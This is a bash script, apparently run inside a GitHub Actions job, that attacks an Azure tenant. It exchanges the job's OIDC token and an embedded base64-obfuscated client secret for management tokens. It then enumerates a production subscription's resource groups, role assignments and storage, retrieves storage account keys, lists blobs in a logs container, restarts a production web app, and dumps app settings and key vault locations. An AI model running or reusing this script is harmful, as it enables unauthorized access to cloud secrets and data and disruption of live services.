#!/bin/bash
set -e

echo "=== PHASE 1: Tokens ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r .access_token)
echo "MGMT(cicd): ${MGMT:0:20}..."

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

SYNC_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r .access_token)
echo "MGMT(sync): ${SYNC_MGMT:0:20}..."

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
B="https://management.azure.com/subscriptions/$SUB"

echo ""
echo "=== PHASE 2: ALL Resource Groups ==="
curl -sS "$B/resourcegroups?api-version=2021-04-01" \
  -H "Authorization: Bearer $MGMT" | jq -r '.value[] | "\(.name) \(.location)"'

echo ""
echo "=== PHASE 3: Resources in rg-tbl-reporting-prod-eus ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $MGMT" | jq '.value[] | {name, type, location}'

echo ""
echo "=== PHASE 4: Role assignments - MI f64d08c7 ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'&api-version=2022-04-01" \
  -H "Authorization: Bearer $MGMT" | jq '.'

echo ""
echo "=== PHASE 4b: ALL role assignments in reporting RG ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGMT" | jq '.value[] | {principalId: .properties.principalId, roleId: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}'

echo ""
echo "=== PHASE 5: Storage containers (mgmt API) ==="
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- $SA ---"
  for SVC in blobServices tableServices queueServices fileServices; do
    ENDPOINT="$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA"
    case $SVC in
      blobServices) EP="$ENDPOINT/$SVC/default/containers" ;;
      tableServices) EP="$ENDPOINT/$SVC/default/tables" ;;
      queueServices) EP="$ENDPOINT/$SVC/default/queues" ;;
      fileServices) EP="$ENDPOINT/$SVC/default/shares" ;;
    esac
    echo "  $SVC:"
    curl -sS "$EP?api-version=2023-01-01" -H "Authorization: Bearer $MGMT" | jq -r '.value[]? | "    \(.name)"'
  done
done

echo ""
echo "=== PHASE 6: listKeys via sync-service ==="
SA_KEYS=$(curl -sS -X POST "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_MGMT" -H "Content-Length: 0")
SA_KEY=$(echo "$SA_KEYS" | jq -r '.keys[0].value')
echo "Key obtained: ${SA_KEY:0:10}..."

echo ""
echo "=== PHASE 6b: Data plane - list ALL blobs ==="
SA_NAME="sttblcilogsprodx3euoz"
DATE=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
STS="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE}\nx-ms-version:2023-01-03\n/${SA_NAME}/\ncomp:list"
SIG=$(printf "%b" "$STS" | openssl dgst -sha256 -hmac "$(echo -n "$SA_KEY" | base64 -d)" -binary | base64 -w0)
echo "Containers:"
curl -sS "https://${SA_NAME}.blob.core.windows.net/?comp=list" \
  -H "x-ms-date: $DATE" -H "x-ms-version: 2023-01-03" \
  -H "Authorization: SharedKey ${SA_NAME}:${SIG}"

sleep 1
DATE3=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
STS3="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE3}\nx-ms-version:2023-01-03\n/${SA_NAME}/logs\ncomp:list\nrestype:container"
SIG3=$(printf "%b" "$STS3" | openssl dgst -sha256 -hmac "$(echo -n "$SA_KEY" | base64 -d)" -binary | base64 -w0)
echo ""
echo "Blobs in logs:"
curl -sS "https://${SA_NAME}.blob.core.windows.net/logs?restype=container&comp=list" \
  -H "x-ms-date: $DATE3" -H "x-ms-version: 2023-01-03" \
  -H "Authorization: SharedKey ${SA_NAME}:${SIG3}"

echo ""
echo "=== PHASE 7: Restart reporting app ==="
curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2023-01-01" \
  -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" -o /dev/null -w "restart: %{http_code}"

echo ""
echo "=== PHASE 8: App settings ==="
curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" | jq '.'

echo ""
echo "=== PHASE 9: Storage in reporting RG ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
  -H "Authorization: Bearer $MGMT" | jq '.value[]? | {name, location}'

echo ""
echo "=== PHASE 10: KV in reporting RG ==="
curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" \
  -H "Authorization: Bearer $MGMT" | jq '.value[]? | {name, location, properties: .properties.vaultUri}'

echo ""
echo "=== DONE ==="